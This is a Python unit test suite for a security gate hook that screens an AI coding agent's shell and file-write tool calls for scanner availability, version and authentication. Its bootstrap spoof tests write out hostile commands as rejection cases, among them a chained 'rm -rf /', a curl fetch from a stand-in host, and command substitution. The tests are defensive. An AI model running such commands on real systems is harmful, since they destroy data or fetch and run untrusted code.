"""Unit tests for the cx-security PreToolUse gate (cx_check.py).

Run: python3 hooks/test_cx_check.py    (stdlib only — no pytest needed)

Each case drives cx_check.cx_check() with a controlled environment (which/version/auth
stubbed) and asserts the printed permissionDecision and the process exit code. exit 2 ==
blocking deny; exit 0 == allow / pass-through.
"""

import io
import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
from contextlib import redirect_stdout, redirect_stderr

# Source under test lives in the plugin's hooks/ (tests live at the repo root, outside the plugin).
_HOOKS_DIR = os.path.normpath(os.path.join(
    os.path.dirname(os.path.abspath(__file__)), "..", "..", "plugins", "cx-security", "hooks"))
sys.path.insert(0, _HOOKS_DIR)
import cx_check  # noqa: E402

BOOTSTRAP = cx_check._bootstrap_script_path()
CX_CHECK_SH = os.path.join(_HOOKS_DIR, "cx_check.sh")
SH = shutil.which("sh")

# Set by run() to the full hookSpecificOutput dict of the last gate invocation (or None), so tests
# can assert on permissionDecisionReason / additionalContext, not just the decision.
LAST_OUTPUT = None


def _fake_proc(stderr=b"", stdout=b"", returncode=0):
    """Minimal stand-in for a subprocess.CompletedProcess (returncode/stdout/stderr bytes)."""
    class _P:
        pass
    p = _P()
    p.returncode = returncode
    p.stdout = stdout
    p.stderr = stderr
    return p


def run(hook_input, *, which="cx", version_state="ok", authed=True,
        scanner_state=cx_check._SCANNER_SCAN, env=None):
    """Invoke cx_check() with stubs. Returns (decision_or_None, exit_code).

    decision is the parsed permissionDecision ('allow'/'deny'), or None when cx_check
    returns normally (a silent pass-through / allow). scanner_state stubs the stage-2
    scanner readiness probe (_SCANNER_SCAN by default = scanner authenticated & will scan)."""
    orig = {
        "which": cx_check.shutil.which,
        "vstate": cx_check._version_state,
        "authed": cx_check._is_authenticated,
        "scanner": cx_check._scanner_state,
        "read": cx_check._read_hook_input,
        "environ": cx_check.os.environ,
    }
    cx_check.shutil.which = lambda name: which
    cx_check._version_state = lambda identity=None: version_state
    cx_check._is_authenticated = lambda identity=None: authed
    cx_check._scanner_state = lambda identity=None: scanner_state
    cx_check._read_hook_input = lambda: hook_input
    # Disable structured logging during gate tests so they never write to the user's real
    # ~/.checkmarx log — unless a test opts in by providing CX_LOG_DIR (a temp dir).
    e = dict(env) if env is not None else {}
    if "CX_LOG_DIR" not in e:
        e.setdefault("CX_LOG_DISABLE", "1")
    cx_check.os.environ = e

    out = io.StringIO()
    code = 0
    try:
        with redirect_stdout(out), redirect_stderr(io.StringIO()):
            cx_check.cx_check()
    except SystemExit as e:
        code = e.code if isinstance(e.code, int) else 1
    finally:
        cx_check.shutil.which = orig["which"]
        cx_check._version_state = orig["vstate"]
        cx_check._is_authenticated = orig["authed"]
        cx_check._scanner_state = orig["scanner"]
        cx_check._read_hook_input = orig["read"]
        cx_check.os.environ = orig["environ"]

    global LAST_OUTPUT
    LAST_OUTPUT = None
    decision = None
    text = out.getvalue().strip()
    if text:
        try:
            LAST_OUTPUT = json.loads(text)["hookSpecificOutput"]
            decision = LAST_OUTPUT["permissionDecision"]
        except (ValueError, KeyError):
            decision = "<unparseable:%s>" % text
    return decision, code


def bash(command):
    return {"tool_name": "Bash", "tool_input": {"command": command}}


def write(content):
    return {"tool_name": "Write", "tool_input": {"file_path": "/x", "content": content}}


class TestMissingCx(unittest.TestCase):
    def test_absent_denies_even_offline(self):
        decision, code = run(bash("echo hi"), which=None)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_absent_still_allows_bootstrap(self):
        decision, code = run(bash('bash "%s" install' % BOOTSTRAP), which=None)
        self.assertIsNone(decision)  # silent pass-through
        self.assertEqual(code, 0)


class TestVersionGate(unittest.TestCase):
    def test_below_min_denies(self):
        decision, code = run(bash("echo hi"), version_state="below")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_below_min_blocks_cx_auth_login(self):
        # Version gate is BEFORE auth-recovery, so an old build can't escape via cx auth.
        decision, code = run(bash("cx auth login"), version_state="below")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_unrunnable_denies(self):
        decision, code = run(bash("echo hi"), version_state="unrunnable")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_dev_falls_through_to_auth(self):
        decision, code = run(bash("echo hi"), version_state="dev", authed=True)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_dev_unauthenticated_denies(self):
        decision, code = run(bash("echo hi"), version_state="dev", authed=False)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_ok_authed_passes(self):
        decision, code = run(bash("echo hi"), version_state="ok", authed=True)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_ok_unauthed_denies(self):
        decision, code = run(bash("echo hi"), version_state="ok", authed=False)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)


class TestAuthRecovery(unittest.TestCase):
    def test_cx_auth_allowed_when_unauthenticated(self):
        decision, code = run(bash("cx auth login"), version_state="ok", authed=False)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_cx_configure_allowed_when_unauthenticated(self):
        decision, code = run(bash("cx configure set --prop-name cx_apikey --prop-value X"),
                             version_state="ok", authed=False)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)


class TestScannerPassthrough(unittest.TestCase):
    """The OAuth fail-open fix: when `cx auth validate` passes but the native scanner would run in
    pass-through (allow-everything, NO scan), the gate must FAIL CLOSED + VISIBLY — the same
    /cx-cli-setup UX as the unauthenticated path — instead of silently allowing the write."""

    def test_passthrough_denies_visibly_on_write(self):
        decision, code = run(write("Runtime.getRuntime().exec(userInput)"),
                             authed=True, scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)
        self.assertIn("/cx-cli-setup", LAST_OUTPUT["additionalContext"])
        self.assertIn("authenticate", LAST_OUTPUT["additionalContext"].lower())

    def test_passthrough_blocks_bash_too(self):
        decision, code = run(bash("echo hi"), authed=True,
                             scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_scan_ready_passes(self):
        decision, code = run(write("print('ok')"), authed=True,
                             scanner_state=cx_check._SCANNER_SCAN)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_unknown_defers_to_real_scanner(self):
        # An inconclusive probe must NOT over-block a genuinely-authenticated user; defer to stage 2.
        decision, code = run(write("print('ok')"), authed=True,
                             scanner_state=cx_check._SCANNER_UNKNOWN)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_unauthenticated_message_takes_precedence(self):
        # If validate itself fails, the unauthenticated deny fires before the scanner probe.
        decision, code = run(bash("echo hi"), authed=False,
                             scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_auth_recovery_bypasses_passthrough(self):
        # `cx auth login` must still run while the scanner is in pass-through — it's how you fix it.
        decision, code = run(bash("cx auth login"), authed=False,
                             scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_configure_apikey_bypasses_passthrough(self):
        decision, code = run(bash("cx configure set --prop-name cx_apikey --prop-value X"),
                             authed=True, scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_bootstrap_bypasses_passthrough(self):
        decision, code = run(bash('bash "%s" install' % BOOTSTRAP), authed=True,
                             scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_allow_unscanned_bypasses_passthrough(self):
        orig_audit = cx_check._UNSCANNED_AUDIT_FILE
        cx_check._UNSCANNED_AUDIT_FILE = os.path.join(tempfile.mkdtemp(), "audit.log")
        try:
            decision, code = run(write("Runtime.getRuntime().exec(userInput)"), authed=True,
                                 scanner_state=cx_check._SCANNER_PASSTHROUGH,
                                 env={"CX_ALLOW_UNSCANNED": "1"})
            self.assertEqual(decision, "allow")
            self.assertEqual(code, 0)
        finally:
            cx_check._UNSCANNED_AUDIT_FILE = orig_audit


class TestRecoveryMessaging(unittest.TestCase):
    """The deny messages must tell the agent it can run cx auth/configure ITSELF (the carve-out), so
    it runs `cx auth login` directly (browser auto-opens) instead of punting to the user with `!`."""

    def test_unauthenticated_message_steers_agent_to_run_login(self):
        decision, code = run(write("x"), authed=False)
        self.assertEqual(decision, "deny")
        ctx = LAST_OUTPUT["additionalContext"]
        self.assertIn("cx auth login", ctx)
        self.assertIn("`!`", ctx)  # explicitly tells the agent NOT to use the ! prefix
        # The old misleading blanket phrasing must be gone (it made the agent punt).
        self.assertNotIn("All agent actions remain blocked until authentication succeeds", ctx)

    def test_scanner_passthrough_message_steers_agent_to_run_recovery(self):
        decision, code = run(write("x"), authed=True, scanner_state=cx_check._SCANNER_PASSTHROUGH)
        self.assertEqual(decision, "deny")
        ctx = LAST_OUTPUT["additionalContext"]
        self.assertIn("cx auth login", ctx)
        self.assertIn("YOURSELF", ctx)
        self.assertIn("`!`", ctx)


class TestLoggingAndIdentity(unittest.TestCase):
    """PR#15 #4: one log event per bootstrap-allow (no redundant `bootstrap` event).
    PR#15 #3: _version_state accepts the single binary-identity snapshot."""

    def test_bootstrap_emits_single_gate_decision_event(self):
        events = []
        saved = (cx_check._log, cx_check._read_hook_input)
        cx_check._log = lambda event, **f: events.append((event, f))
        cx_check._read_hook_input = lambda: bash('bash "%s" install' % BOOTSTRAP)
        try:
            cx_check.cx_check()  # bootstrap carve-out returns (allow); no SystemExit
        except SystemExit:
            pass
        finally:
            cx_check._log, cx_check._read_hook_input = saved
        self.assertEqual(len(events), 1, events)
        self.assertEqual(events[0][0], "gate_decision")
        self.assertEqual(events[0][1].get("reason_code"), "bootstrap")
        self.assertNotIn("bootstrap", [e for e, _ in events])  # no separate redundant event

    def test_version_state_accepts_identity_snapshot(self):
        saved = (cx_check._version_state_uncached, cx_check._VERSION_CACHE_FILE)
        cx_check._version_state_uncached = lambda: "dev"
        cx_check._VERSION_CACHE_FILE = None  # no cache read/write side effects
        try:
            self.assertEqual(cx_check._version_state(("/path/cx", 123.0)), "dev")
        finally:
            cx_check._version_state_uncached, cx_check._VERSION_CACHE_FILE = saved


class TestScannerProbe(unittest.TestCase):
    """_probe_scanner_passthrough classifies the scanner's --debug stderr; never raises."""

    def _stub_run(self, fake):
        orig = cx_check.subprocess.run
        cx_check.subprocess.run = fake
        self.addCleanup(lambda: setattr(cx_check.subprocess, "run", orig))

    def test_marker_means_passthrough(self):
        self._stub_run(lambda *a, **k: _fake_proc(
            stderr=b"2026/.. hooks: running in pass-through mode (not authenticated)\n"))
        self.assertEqual(cx_check._probe_scanner_passthrough(), cx_check._SCANNER_PASSTHROUGH)

    def test_no_marker_means_scan(self):
        self._stub_run(lambda *a, **k: _fake_proc(
            stdout=b'{"hookSpecificOutput":{"permissionDecision":"allow"}}',
            stderr=b"2026/.. some unrelated debug line\n"))
        self.assertEqual(cx_check._probe_scanner_passthrough(), cx_check._SCANNER_SCAN)

    def test_spawn_error_means_unknown(self):
        def boom(*a, **k):
            raise FileNotFoundError()
        self._stub_run(boom)
        self.assertEqual(cx_check._probe_scanner_passthrough(), cx_check._SCANNER_UNKNOWN)

    def test_timeout_means_unknown(self):
        def slow(*a, **k):
            raise cx_check.subprocess.TimeoutExpired(cmd="cx", timeout=8)
        self._stub_run(slow)
        self.assertEqual(cx_check._probe_scanner_passthrough(), cx_check._SCANNER_UNKNOWN)


class TestScannerCache(unittest.TestCase):
    """Only a positive 'will-scan' result is cached, keyed to binary identity AND credential mtime."""

    def setUp(self):
        self._dir = tempfile.mkdtemp()
        self._saved = {
            "file": cx_check._SCANNER_CACHE_FILE,
            "cred": cx_check._credential_mtime,
            "probe": cx_check._probe_scanner_passthrough,
        }
        cx_check._SCANNER_CACHE_FILE = os.path.join(self._dir, "cx_scanner_cache")
        cx_check._credential_mtime = lambda: 1234.0
        self.addCleanup(self._restore)

    def _restore(self):
        cx_check._SCANNER_CACHE_FILE = self._saved["file"]
        cx_check._credential_mtime = self._saved["cred"]
        cx_check._probe_scanner_passthrough = self._saved["probe"]

    def test_positive_cached_skips_reprobe(self):
        ident = ("/path/cx", 999.0)
        cx_check._write_scanner_cache(ident)
        cx_check._probe_scanner_passthrough = lambda: self.fail("probe must not run on a cache hit")
        self.assertEqual(cx_check._scanner_state(ident), cx_check._SCANNER_SCAN)

    def test_binary_change_invalidates(self):
        cx_check._write_scanner_cache(("/path/cx", 999.0))
        self.assertFalse(cx_check._scanner_cache_valid(("/path/cx", 1000.0)))

    def test_credential_change_invalidates(self):
        cx_check._write_scanner_cache(("/path/cx", 999.0))
        cx_check._credential_mtime = lambda: 5678.0
        self.assertFalse(cx_check._scanner_cache_valid(("/path/cx", 999.0)))

    def test_passthrough_is_never_cached(self):
        cx_check._probe_scanner_passthrough = lambda: cx_check._SCANNER_PASSTHROUGH
        self.assertEqual(cx_check._scanner_state(("/p", 1.0)), cx_check._SCANNER_PASSTHROUGH)
        self.assertFalse(cx_check._scanner_cache_valid(("/p", 1.0)))

    def test_unknown_is_never_cached(self):
        cx_check._probe_scanner_passthrough = lambda: cx_check._SCANNER_UNKNOWN
        self.assertEqual(cx_check._scanner_state(("/p", 1.0)), cx_check._SCANNER_UNKNOWN)
        self.assertFalse(cx_check._scanner_cache_valid(("/p", 1.0)))

    def test_none_file_never_cached_no_crash(self):
        cx_check._SCANNER_CACHE_FILE = None
        self.assertFalse(cx_check._scanner_cache_valid(("/p", 1.0)))
        cx_check._write_scanner_cache(("/p", 1.0))  # must not raise


class TestAllowUnscanned(unittest.TestCase):
    def test_allows_with_audit(self):
        # Redirect the audit file to a throwaway path so the test never writes into the
        # user's real ~/.checkmarx security audit log.
        orig_audit = cx_check._UNSCANNED_AUDIT_FILE
        cx_check._UNSCANNED_AUDIT_FILE = os.path.join(tempfile.mkdtemp(), "audit.log")
        try:
            decision, code = run(bash("echo hi"), which=None, env={"CX_ALLOW_UNSCANNED": "1"})
            self.assertEqual(decision, "allow")
            self.assertEqual(code, 0)
            with open(cx_check._UNSCANNED_AUDIT_FILE) as f:
                self.assertIn("bypassed scanning", f.read())
        finally:
            cx_check._UNSCANNED_AUDIT_FILE = orig_audit

    def test_denies_when_audit_cannot_be_written(self):
        # The bypass requires a DURABLE audit record. If it can't be written (no log location),
        # an unaudited bypass is refused → deny (exit 2), never a silent unscanned allow.
        orig_audit = cx_check._UNSCANNED_AUDIT_FILE
        cx_check._UNSCANNED_AUDIT_FILE = None
        try:
            decision, code = run(bash("echo hi"), which=None, env={"CX_ALLOW_UNSCANNED": "1"})
            self.assertEqual(decision, "deny")
            self.assertEqual(code, 2)
        finally:
            cx_check._UNSCANNED_AUDIT_FILE = orig_audit


class TestBootstrapCarveOut(unittest.TestCase):
    """The carve-out must allow ONLY a clean bash <bootstrap> [install|upgrade]."""

    def test_plain_install_allowed(self):
        self.assertTrue(cx_check._is_bootstrap_command(bash('bash "%s" install' % BOOTSTRAP)))

    def test_plain_upgrade_allowed(self):
        self.assertTrue(cx_check._is_bootstrap_command(bash('bash "%s" upgrade' % BOOTSTRAP)))

    def test_no_mode_rejected(self):
        # A bare `bash "<bootstrap>"` with no install/upgrade is NOT a sanctioned action (review
        # C1/no-mode): the mode is required so the carve-out can't bless an arbitrary invocation.
        self.assertFalse(cx_check._is_bootstrap_command(bash('bash "%s"' % BOOTSTRAP)))

    def test_plugin_root_placeholder_expands_and_verifies(self):
        # The literal ${CLAUDE_PLUGIN_ROOT} placeholder is honored ONLY when it expands (from the
        # gate's env) to THIS plugin's bundled bootstrap; unset/foreign roots fail closed.
        cmd = 'bash "${CLAUDE_PLUGIN_ROOT}/scripts/cx-bootstrap.sh" install'
        root = os.path.dirname(os.path.dirname(BOOTSTRAP))  # <plugin> (… /scripts/cx-bootstrap.sh)
        old = cx_check.os.environ
        try:
            cx_check.os.environ = {"CLAUDE_PLUGIN_ROOT": root}
            self.assertTrue(cx_check._is_bootstrap_command(bash(cmd)))
            cx_check.os.environ = {}  # unset → cannot prove → fail closed
            self.assertFalse(cx_check._is_bootstrap_command(bash(cmd)))
            cx_check.os.environ = {"CLAUDE_PLUGIN_ROOT": "/some/other/plugin"}  # foreign → reject
            self.assertFalse(cx_check._is_bootstrap_command(bash(cmd)))
        finally:
            cx_check.os.environ = old

    def test_chained_rm_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('bash "%s"; rm -rf /' % BOOTSTRAP)))

    def test_pipe_into_bash_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('cat "%s" | bash' % BOOTSTRAP)))

    def test_env_prefix_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('FOO=1 bash "%s"' % BOOTSTRAP)))

    def test_wrong_path_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('bash /evil/cx-bootstrap.sh')))

    def test_extra_arg_payload_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('bash "%s" -c evil' % BOOTSTRAP)))

    def test_command_substitution_rejected(self):
        self.assertFalse(cx_check._is_bootstrap_command(bash('bash "%s" $(whoami)' % BOOTSTRAP)))

    def test_process_substitution_rejected(self):
        self.assertFalse(
            cx_check._is_bootstrap_command(bash('bash "%s" install <(curl http://e/x)' % BOOTSTRAP))
        )

    def test_output_redirect_rejected(self):
        self.assertFalse(
            cx_check._is_bootstrap_command(bash('bash "%s" upgrade > /tmp/pwn' % BOOTSTRAP))
        )

    def test_write_with_path_content_rejected(self):
        # A Write whose CONTENT is the path is not a Bash call → never a bootstrap command.
        self.assertFalse(cx_check._is_bootstrap_command(write('bash "%s" install' % BOOTSTRAP)))

    def test_spoof_commands_all_deny_at_gate(self):
        # End-to-end: every spoof, with cx absent, must reach the deny (not the carve-out).
        spoofs = [
            bash('bash "%s"; rm -rf /' % BOOTSTRAP),
            bash('cat "%s" | bash' % BOOTSTRAP),
            bash('FOO=1 bash "%s"' % BOOTSTRAP),
            bash('bash /evil/cx-bootstrap.sh'),
            bash('bash "%s" -c evil' % BOOTSTRAP),
            write('bash "%s" install' % BOOTSTRAP),
        ]
        for s in spoofs:
            decision, code = run(s, which=None)
            self.assertEqual(decision, "deny", msg="spoof slipped through: %r" % s)
            self.assertEqual(code, 2)


class TestCapabilityGate(unittest.TestCase):
    """A build that satisfies the numeric/dev pre-filter but is MISSING the agent-security
    subcommands is 'incapable' and must be blocked exactly like a below-min build."""

    def test_incapable_denies(self):
        decision, code = run(bash("echo hi"), version_state="incapable")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_incapable_blocks_cx_auth(self):
        # Capability gate is BEFORE auth-recovery (like the version gate): an incapable build
        # can't run the MCP anyway, so the fix is to upgrade, not to authenticate.
        decision, code = run(bash("cx auth login"), version_state="incapable")
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)


class TestCapabilityProbe(unittest.TestCase):
    """_capabilities_present() is True only when every probe exits 0; any non-zero exit or
    spawn failure (missing subcommand) is fail-closed False."""

    class _Result:
        def __init__(self, rc):
            self.returncode = rc

    def _stub(self, codes):
        seq = {"i": 0}

        def fake(args, **kwargs):
            i = seq["i"]
            seq["i"] += 1
            c = codes[i] if i < len(codes) else 0
            if isinstance(c, type) and issubclass(c, Exception):
                raise c()
            return self._Result(c)

        return fake

    def _with_run(self, codes, expected):
        orig = cx_check.subprocess.run
        cx_check.subprocess.run = self._stub(codes)
        try:
            self.assertEqual(cx_check._capabilities_present(), expected)
        finally:
            cx_check.subprocess.run = orig

    def test_all_zero_is_capable(self):
        self._with_run([0, 0], True)

    def test_one_nonzero_not_capable(self):
        self._with_run([0, 1], False)

    def test_first_nonzero_short_circuits(self):
        self._with_run([1, 0], False)

    def test_missing_subcommand_not_capable(self):
        self._with_run([FileNotFoundError], False)


class TestVersionStateCapability(unittest.TestCase):
    """_version_state_uncached() folds the capability probe into classification."""

    def _classify(self, version, capable):
        orig_v = cx_check._cx_version
        orig_c = cx_check._capabilities_present
        cx_check._cx_version = lambda: version
        cx_check._capabilities_present = capable  # may be a lambda that raises if called
        try:
            return cx_check._version_state_uncached()
        finally:
            cx_check._cx_version = orig_v
            cx_check._capabilities_present = orig_c

    def _raise(self):
        raise AssertionError("capability probe must NOT run for a below-min build")

    def test_numeric_ok_and_capable(self):
        self.assertEqual(self._classify("2.99.0", lambda: True), "ok")

    def test_numeric_ok_but_incapable(self):
        self.assertEqual(self._classify("2.99.0", lambda: False), "incapable")

    def test_dev_and_capable(self):
        self.assertEqual(self._classify("dev", lambda: True), "dev")

    def test_dev_but_incapable(self):
        self.assertEqual(self._classify("dev", lambda: False), "incapable")

    def test_below_skips_capability_probe(self):
        # A below-min build returns 'below' WITHOUT probing capability.
        self.assertEqual(self._classify("0.0.1", self._raise), "below")

    def test_unrunnable_skips_capability_probe(self):
        self.assertEqual(self._classify(None, self._raise), "unrunnable")


class TestAgentLogDir(unittest.TestCase):
    """Per-user state moved out of world-writable OS temp into ~/.checkmarx/agent-logs/."""

    def test_default_path_segments(self):
        old = os.environ.pop("CX_LOG_DIR", None)
        try:
            d = cx_check._agent_log_dir().replace("\\", "/")
            self.assertTrue(os.path.isdir(cx_check._agent_log_dir()))
            # Default location, unless HOME isn't writable here (then it degrades to temp).
            self.assertTrue(
                d.endswith(".checkmarx/agent-logs/claude")
                or d == tempfile.gettempdir().replace("\\", "/")
            )
        finally:
            if old is not None:
                os.environ["CX_LOG_DIR"] = old

    def test_cx_log_dir_override_and_perms(self):
        target = os.path.join(tempfile.mkdtemp(), "agent-logs")
        old = os.environ.get("CX_LOG_DIR")
        os.environ["CX_LOG_DIR"] = target
        try:
            d = cx_check._agent_log_dir()
            self.assertEqual(os.path.realpath(d), os.path.realpath(target))
            self.assertTrue(os.path.isdir(d))
            if os.name != "nt":
                self.assertEqual(stat.S_IMODE(os.stat(d).st_mode), 0o700)
        finally:
            if old is None:
                os.environ.pop("CX_LOG_DIR", None)
            else:
                os.environ["CX_LOG_DIR"] = old

    def test_state_files_live_under_agent_log_dir(self):
        for path in (
            cx_check._AUTH_CACHE_FILE,
            cx_check._VERSION_CACHE_FILE,
            cx_check._UNSCANNED_AUDIT_FILE,
        ):
            self.assertEqual(os.path.dirname(path), cx_check._AGENT_LOG_DIR)


class TestCxBinaryOverride(unittest.TestCase):
    """CX_BINARY pins the gate to a specific cx by absolute path; a set-but-invalid value fails
    closed, a valid override is routed through every gate probe, and — because the native scanner
    and MCP run bare `cx` from PATH — the gate additionally requires PATH cx to be that same file
    (else it would pass while the scanner can't run = fail open)."""

    def _make_exe(self):
        p = os.path.join(tempfile.mkdtemp(), "cx")
        with open(p, "w") as f:
            f.write("#!/bin/sh\n")
        if os.name != "nt":
            os.chmod(p, 0o755)
        return p

    def _with_env(self, env, fn):
        old = cx_check.os.environ
        cx_check.os.environ = env
        try:
            return fn()
        finally:
            cx_check.os.environ = old

    def test_unset_uses_cx(self):
        self.assertEqual(self._with_env({}, cx_check._cx_binary), ("cx", None))
        self.assertEqual(self._with_env({}, cx_check._cx_exe), "cx")

    def test_relative_path_rejected(self):
        exe, err = self._with_env({"CX_BINARY": "relative/cx"}, cx_check._cx_binary)
        self.assertIsNone(exe)
        self.assertIsNotNone(err)

    def test_nonexistent_rejected(self):
        bogus = os.path.join(tempfile.mkdtemp(), "nope-cx")
        exe, err = self._with_env({"CX_BINARY": bogus}, cx_check._cx_binary)
        self.assertIsNone(exe)
        self.assertIsNotNone(err)

    def test_valid_abs_executable_accepted(self):
        p = self._make_exe()
        exe, err = self._with_env({"CX_BINARY": p}, cx_check._cx_binary)
        self.assertEqual(exe, p)
        self.assertIsNone(err)
        self.assertEqual(self._with_env({"CX_BINARY": p}, cx_check._cx_exe), p)

    def test_invalid_cx_binary_denies_in_gate(self):
        decision, code = run(bash("echo hi"), env={"CX_BINARY": "relative/cx"})
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_valid_cx_binary_but_not_on_path_denies(self):
        # The native scanner + MCP run bare `cx` from PATH, so a valid CX_BINARY that is NOT also
        # on PATH must FAIL CLOSED — otherwise the gate passes while the scanner can't run.
        p = self._make_exe()
        decision, code = run(bash("echo hi"), which=None, version_state="ok",
                             authed=True, env={"CX_BINARY": p})
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_valid_cx_binary_matching_path_cx_passes(self):
        # CX_BINARY set AND `cx` on PATH resolves to the SAME file → the gate validated the binary
        # the scanner will actually run → pass-through.
        p = self._make_exe()
        decision, code = run(bash("echo hi"), which=p, version_state="ok",
                             authed=True, env={"CX_BINARY": p})
        self.assertIsNone(decision)
        self.assertEqual(code, 0)

    def test_cx_binary_differs_from_path_cx_denies(self):
        # CX_BINARY and PATH cx are DIFFERENT files → the scanner would run an unvalidated binary →
        # fail-closed mismatch deny (closes the fail-open the gate would otherwise hide).
        p = self._make_exe()
        q = self._make_exe()
        decision, code = run(bash("echo hi"), which=q, version_state="ok",
                             authed=True, env={"CX_BINARY": p})
        self.assertEqual(decision, "deny")
        self.assertEqual(code, 2)

    def test_gate_probes_use_cx_binary(self):
        # _cx_version, _capabilities_present, _is_authenticated must all invoke CX_BINARY.
        p = self._make_exe()
        seen = []

        class _R:
            returncode = 0
            stdout = b"2.99.0"
            stderr = b""

        def fake(args, **kwargs):
            seen.append(args[0])
            return _R()

        old_env = cx_check.os.environ
        old_run = cx_check.subprocess.run
        old_cache = cx_check._AUTH_CACHE_FILE
        cx_check.os.environ = {"CX_BINARY": p}
        cx_check.subprocess.run = fake
        cx_check._AUTH_CACHE_FILE = os.path.join(tempfile.mkdtemp(), "nocache")
        try:
            cx_check._cx_version()
            cx_check._capabilities_present()
            cx_check._is_authenticated()
            self.assertTrue(seen and all(a == p for a in seen),
                            "all gate probes must invoke CX_BINARY; got %r" % seen)
        finally:
            cx_check.os.environ = old_env
            cx_check.subprocess.run = old_run
            cx_check._AUTH_CACHE_FILE = old_cache


class TestVersionCacheKeying(unittest.TestCase):
    """The version cache is keyed to the resolved cx binary + mtime + min-version. A cached 'ok'
    must NOT be reused after any of those change within the TTL — otherwise a cx swapped for an
    older/incapable build would ride a stale pass = fail open (review F-CR4)."""

    def setUp(self):
        self._orig = {
            "cache": cx_check._VERSION_CACHE_FILE,
            "which": cx_check.shutil.which,
            "uncached": cx_check._version_state_uncached,
            "environ": cx_check.os.environ,
        }
        self._tmp = tempfile.mkdtemp()
        cx_check._VERSION_CACHE_FILE = os.path.join(self._tmp, "vcache")
        cx_check.os.environ = {}  # no CX_BINARY → _cx_exe() == "cx"
        # A real file so _version_cache_key()'s getmtime succeeds; which('cx') resolves to it.
        self._cx = os.path.join(self._tmp, "cx")
        with open(self._cx, "w") as f:
            f.write("#!/bin/sh\n")
        cx_check.shutil.which = lambda name: self._cx

    def tearDown(self):
        cx_check._VERSION_CACHE_FILE = self._orig["cache"]
        cx_check.shutil.which = self._orig["which"]
        cx_check._version_state_uncached = self._orig["uncached"]
        cx_check.os.environ = self._orig["environ"]

    def test_matching_key_is_a_cache_hit(self):
        rec = {"state": "ok"}
        rec.update(cx_check._version_cache_key())
        with open(cx_check._VERSION_CACHE_FILE, "w", encoding="utf-8") as f:
            f.write(json.dumps(rec))
        cx_check._version_state_uncached = lambda: "below"  # would differ if re-probed
        self.assertEqual(cx_check._version_state(), "ok")

    def test_stale_binary_key_forces_reprobe(self):
        stale = {"state": "ok", "cx": "/some/other/cx", "mtime": 1.0, "min": "0.0.0"}
        with open(cx_check._VERSION_CACHE_FILE, "w", encoding="utf-8") as f:
            f.write(json.dumps(stale))
        cx_check._version_state_uncached = lambda: "incapable"
        self.assertEqual(cx_check._version_state(), "incapable")

    def test_legacy_bare_string_cache_is_ignored(self):
        # Pre-keying format (a bare 'ok' string) is not valid JSON → must re-probe, not be trusted.
        with open(cx_check._VERSION_CACHE_FILE, "w", encoding="utf-8") as f:
            f.write("ok")
        cx_check._version_state_uncached = lambda: "below"
        self.assertEqual(cx_check._version_state(), "below")


class TestAuthCacheKeying(unittest.TestCase):
    """The auth cache is keyed to the resolved cx binary identity — a swapped binary re-validates
    instead of riding a stale auth pass; the legacy bare-timestamp format is not trusted; and a
    None path (no private state dir) is never valid and never raises (review F-CR backlog #1/#3)."""

    def setUp(self):
        self._orig = {
            "cache": cx_check._AUTH_CACHE_FILE,
            "which": cx_check.shutil.which,
            "environ": cx_check.os.environ,
        }
        self._tmp = tempfile.mkdtemp()
        cx_check._AUTH_CACHE_FILE = os.path.join(self._tmp, "acache")
        cx_check.os.environ = {}  # no CX_BINARY → _cx_exe() == "cx"
        self._cx = os.path.join(self._tmp, "cx")
        with open(self._cx, "w") as f:
            f.write("#!/bin/sh\n")
        cx_check.shutil.which = lambda name: self._cx

    def tearDown(self):
        cx_check._AUTH_CACHE_FILE = self._orig["cache"]
        cx_check.shutil.which = self._orig["which"]
        cx_check.os.environ = self._orig["environ"]

    def test_fresh_same_binary_is_valid(self):
        cx_check._write_auth_cache()
        self.assertTrue(cx_check._auth_cache_valid())

    def test_swapped_binary_invalidates(self):
        cx_check._write_auth_cache()
        other = os.path.join(self._tmp, "cx2")
        with open(other, "w") as f:
            f.write("#!/bin/sh\n")
        cx_check.shutil.which = lambda name: other  # different file → identity mismatch
        self.assertFalse(cx_check._auth_cache_valid())

    def test_legacy_bare_timestamp_ignored(self):
        with open(cx_check._AUTH_CACHE_FILE, "w") as f:
            f.write("1700000000.0")  # old format: a bare timestamp, not the keyed JSON record
        self.assertFalse(cx_check._auth_cache_valid())

    def test_none_path_never_valid_and_never_raises(self):
        cx_check._AUTH_CACHE_FILE = None
        self.assertFalse(cx_check._auth_cache_valid())
